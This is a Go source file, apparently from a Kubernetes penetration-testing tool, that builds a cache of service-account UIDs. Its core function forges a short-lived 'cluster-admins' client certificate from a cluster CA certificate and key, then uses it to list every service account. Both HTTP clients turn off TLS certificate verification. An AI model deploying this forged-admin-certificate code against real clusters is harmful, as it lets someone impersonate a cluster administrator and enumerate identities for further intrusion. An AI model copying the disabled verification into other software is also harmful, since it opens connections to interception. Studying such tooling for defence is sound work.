package golden

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"kctl/internal/client"
	"kctl/pkg/types"
)

// DefaultUIDCachePath 默认 UID 缓存路径
const DefaultUIDCachePath = "uid_cache.json"

// LoadUIDCache 加载 UID 缓存
func LoadUIDCache(path string) (*types.UIDCache, error) {
	if path == "" {
		return nil, fmt.Errorf("未指定 UID 缓存路径")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("读取 UID 缓存失败: %w", err)
	}

	var cache types.UIDCache
	if err := json.Unmarshal(data, &cache); err != nil {
		return nil, fmt.Errorf("解析 UID 缓存失败: %w", err)
	}

	if cache.Entries == nil {
		cache.Entries = make(map[string]string)
	}

	return &cache, nil
}

// SaveUIDCache 保存 UID 缓存
func SaveUIDCache(path string, cache *types.UIDCache) error {
	if path == "" {
		path = DefaultUIDCachePath
	}

	data, err := json.MarshalIndent(cache, "", "  ")
	if err != nil {
		return fmt.Errorf("序列化 UID 缓存失败: %w", err)
	}

	if err := os.WriteFile(path, data, 0600); err != nil {
		return fmt.Errorf("写入 UID 缓存失败: %w", err)
	}

	return nil
}

// LookupUID 从缓存查找 UID
func LookupUID(cache *types.UIDCache, namespace, name string) (string, error) {
	if cache == nil || cache.Entries == nil {
		return "", fmt.Errorf("UID 缓存为空")
	}

	key := fmt.Sprintf("%s/%s", namespace, name)
	uid, ok := cache.Entries[key]
	if !ok {
		return "", fmt.Errorf("未找到 %s 的 UID，请更新缓存或手动指定 --uid", key)
	}

	return uid, nil
}

// ServiceAccountListResponse API 响应结构
type ServiceAccountListResponse struct {
	Items []ServiceAccountItem `json:"items"`
}

// ServiceAccountItem ServiceAccount 项
type ServiceAccountItem struct {
	Metadata ServiceAccountMetadata `json:"metadata"`
}

// ServiceAccountMetadata ServiceAccount 元数据
type ServiceAccountMetadata struct {
	Name      string `json:"name"`
	Namespace string `json:"namespace"`
	UID       string `json:"uid"`
}

// FetchAllServiceAccounts 从 API Server 获取所有 ServiceAccount
func FetchAllServiceAccounts(ctx context.Context, serverURL, token string, cfg *client.Config) (*types.UIDCache, error) {
	if serverURL == "" {
		return nil, fmt.Errorf("未指定 API Server URL")
	}
	if token == "" {
		return nil, fmt.Errorf("未指定认证 Token")
	}

	// 创建 HTTP 客户端
	httpClient := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // 跳过证书验证
			},
		},
	}

	// 如果提供了配置，使用配置中的客户端
	if cfg != nil {
		var err error
		httpClient, err = client.NewHTTPClient(cfg)
		if err != nil {
			return nil, fmt.Errorf("创建 HTTP 客户端失败: %w", err)
		}
	}

	// 构建请求
	url := serverURL + "/api/v1/serviceaccounts"
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}

	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/json")

	// 发送请求
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求 API Server 失败: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API Server 返回错误状态: %d", resp.StatusCode)
	}

	// 解析响应
	var saList ServiceAccountListResponse
	if err := json.NewDecoder(resp.Body).Decode(&saList); err != nil {
		return nil, fmt.Errorf("解析响应失败: %w", err)
	}

	// 构建缓存
	cache := &types.UIDCache{
		Entries:   make(map[string]string),
		ServerURL: serverURL,
		UpdatedAt: time.Now(),
	}

	for _, sa := range saList.Items {
		if sa.Metadata.Name != "" && sa.Metadata.Namespace != "" && sa.Metadata.UID != "" {
			key := fmt.Sprintf("%s/%s", sa.Metadata.Namespace, sa.Metadata.Name)
			cache.Entries[key] = sa.Metadata.UID
		}
	}

	return cache, nil
}

// FetchServiceAccountsWithCert 使用证书认证获取所有 ServiceAccount
// 这个函数会先生成一个临时的管理员证书，然后使用它来获取 SA 列表
func FetchServiceAccountsWithCert(ctx context.Context, serverURL string, opts *types.UpdateUIDOptions, cfg *client.Config) (*types.UIDCache, error) {
	if serverURL == "" {
		return nil, fmt.Errorf("未指定 API Server URL")
	}

	// 先生成一个临时的管理员证书
	tempDir, err := os.MkdirTemp("", "golden-")
	if err != nil {
		return nil, fmt.Errorf("创建临时目录失败: %w", err)
	}
	defer func() { _ = os.RemoveAll(tempDir) }()

	// 伪造管理员证书
	certOpts := &types.UserCertOptions{
		CACertPath: opts.CACertPath,
		CAKeyPath:  opts.CAKeyPath,
		Role:       "cluster-admins",
		Username:   "golden-temp-admin",
		Days:       1, // 只需要 1 天有效期
		OutputDir:  tempDir,
		Force:      true,
	}

	result, err := ForgeUserCert(certOpts)
	if err != nil {
		return nil, fmt.Errorf("生成临时管理员证书失败: %w", err)
	}

	// 使用证书创建 HTTP 客户端
	httpClient, err := createCertAuthClient(opts.CACertPath, result.CertPath, result.KeyPath)
	if err != nil {
		return nil, fmt.Errorf("创建证书认证客户端失败: %w", err)
	}

	// 构建请求
	url := serverURL + "/api/v1/serviceaccounts"
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}

	req.Header.Set("Accept", "application/json")

	// 发送请求
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求 API Server 失败: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API Server 返回错误状态: %d", resp.StatusCode)
	}

	// 解析响应
	var saList ServiceAccountListResponse
	if err := json.NewDecoder(resp.Body).Decode(&saList); err != nil {
		return nil, fmt.Errorf("解析响应失败: %w", err)
	}

	// 构建缓存
	cache := &types.UIDCache{
		Entries:   make(map[string]string),
		ServerURL: serverURL,
		UpdatedAt: time.Now(),
	}

	for _, sa := range saList.Items {
		if sa.Metadata.Name != "" && sa.Metadata.Namespace != "" && sa.Metadata.UID != "" {
			key := fmt.Sprintf("%s/%s", sa.Metadata.Namespace, sa.Metadata.Name)
			cache.Entries[key] = sa.Metadata.UID
		}
	}

	return cache, nil
}

// createCertAuthClient 创建使用证书认证的 HTTP 客户端
func createCertAuthClient(caCertPath, certPath, keyPath string) (*http.Client, error) {
	// 加载客户端证书
	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		return nil, fmt.Errorf("加载客户端证书失败: %w", err)
	}

	// 创建 TLS 配置
	// 注意: 由于设置了 InsecureSkipVerify，CA 证书验证被跳过
	// 这在渗透测试场景中是可接受的
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: true, // 跳过服务器证书验证
	}

	return &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}, nil
}

// ValidateUIDCacheFile 验证 UID 缓存文件
func ValidateUIDCacheFile(path string) error {
	if path == "" {
		return fmt.Errorf("未指定 UID 缓存路径")
	}
	if !FileExists(path) {
		return fmt.Errorf("UID 缓存文件不存在: %s", path)
	}

	cache, err := LoadUIDCache(path)
	if err != nil {
		return err
	}

	if len(cache.Entries) == 0 {
		return fmt.Errorf("UID 缓存为空")
	}

	return nil
}
